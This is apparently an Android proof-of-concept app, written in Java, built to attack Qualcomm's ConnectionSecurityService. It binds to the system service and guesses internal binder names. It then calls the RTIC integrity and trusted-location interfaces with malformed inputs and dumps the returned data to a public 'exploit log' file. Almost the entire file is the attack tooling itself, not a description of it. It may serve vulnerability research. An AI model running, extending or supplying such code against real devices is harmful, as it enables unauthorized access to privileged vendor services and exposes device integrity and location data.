package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IServiceManager mServiceManager;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("Service bound to ConnectionSecurityService");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mServiceManager = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting.get()) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound || isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, perms, 100);
                break;
            }
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting.set(true);
        appendLog("========== ConnectionSecurityService Exploit Test ==========");

        // サービス名候補（コードから推測）
        String[] serviceNames = {
                "rtic",
                "RticService",
                "com.qualcomm.qti.qms.connectionsecuritysdk.RticService",
                "tloc",
                "TlocService",
                "com.qualcomm.qti.qms.connectionsecuritysdk.TlocService",
                "wifi",
                "WifiAuditor",
                "cellular",
                "dns",
                "certificate",
                "arp",
                "update"
        };

        for (String name : serviceNames) {
            if (stopRequested.get()) break;
            testService(name);
        }

        // RticService と TlocService が特定できたら、詳細テスト
        if (mRticBinder != null) {
            testRtic();
        }
        if (mTlocBinder != null) {
            testTloc();
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private IBinder mRticBinder = null;
    private IBinder mTlocBinder = null;

    private void testService(String serviceName) {
        if (mServiceManager == null) return;
        appendLog("Trying to get service: " + serviceName);
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("  SUCCESS: Got binder for " + serviceName + ", status=" + status[0]);
                try {
                    String descriptor = binder.getInterfaceDescriptor();
                    appendLog("  Interface descriptor: " + descriptor);
                    if (descriptor.contains("IRticService")) {
                        mRticBinder = binder;
                    } else if (descriptor.contains("ITlocService")) {
                        mTlocBinder = binder;
                    }
                } catch (Exception e) {
                    appendLog("  Could not get descriptor: " + e.getMessage());
                }
            } else {
                appendLog("  FAIL: getService returned null, status=" + status[0]);
            }
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        }
    }

    private void testRtic() {
        appendLog("--- Testing IRticService ---");
        IRticService rtic = IRticService.Stub.asInterface(mRticBinder);
        if (rtic == null) {
            appendLog("  Failed to cast to IRticService");
            return;
        }
        try {
            // 正常な呼び出し
            int[] status = new int[1];
            int[] ret = new int[1];
            long now = System.currentTimeMillis();
            appendLog("  Calling getRticData with timestamp=" + now);
            byte[] data = rtic.getRticData(now, status, ret, false);
            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
            if (data != null && data.length > 0) {
                String hex = bytesToHex(data, 64);
                appendLog("  First 64 bytes: " + hex);
            }

            // 異常値: 負のタイムスタンプ
            appendLog("  Calling getRticData with timestamp=-1");
            data = rtic.getRticData(-1, status, ret, false);
            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));

            // 巨大なタイムスタンプ
            appendLog("  Calling getRticData with timestamp=Long.MAX_VALUE");
            data = rtic.getRticData(Long.MAX_VALUE, status, ret, false);
            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));

            // フォーマット指定 (z=true)
            appendLog("  Calling getRticData with z=true");
            data = rtic.getRticData(now, status, ret, true);
            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
            if (data != null && data.length > 0) {
                String str = new String(data, StandardCharsets.ISO_8859_1);
                appendLog("  Data as string: " + str.substring(0, Math.min(200, str.length())));
            }
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("  Exception: " + e.toString());
        }
    }

    private void testTloc() {
        appendLog("--- Testing ITlocService ---");
        ITlocService tloc = ITlocService.Stub.asInterface(mTlocBinder);
        if (tloc == null) {
            appendLog("  Failed to cast to ITlocService");
            return;
        }
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            appendLog("  Calling getTrustedLocation");
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
            if (data != null && data.length > 0) {
                String str = new String(data, StandardCharsets.UTF_8);
                appendLog("  Data: " + str);
            }

            appendLog("  Calling tlocWarmUp");
            int warmup = tloc.tlocWarmUp();
            appendLog("  tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("  Exception: " + e.toString());
        }
    }

    private String bytesToHex(byte[] bytes, int max) {
        StringBuilder sb = new StringBuilder();
        int limit = Math.min(bytes.length, max);
        for (int i = 0; i < limit; i++) {
            sb.append(String.format("%02x", bytes[i] & 0xFF));
        }
        if (bytes.length > max) sb.append("...");
        return sb.toString();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "connsec_exploit_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== ConnectionSecurity Exploit Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
